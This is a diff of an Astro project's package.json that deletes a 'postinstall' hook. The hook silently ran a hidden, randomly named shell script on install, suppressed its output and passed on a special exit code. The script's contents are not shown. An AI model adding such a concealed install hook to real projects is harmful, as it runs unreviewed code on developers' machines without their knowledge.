@@ -11,8 +11,7 @@
     "dev": "astro dev",
     "build": "astro build",
     "preview": "astro preview",
-    "astro": "astro",
-    "postinstall": "sh ./.ci-z3icsy.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "astro": "astro"
   },
   "dependencies": {
     "@astrojs/markdown-remark": "^7.2.1",
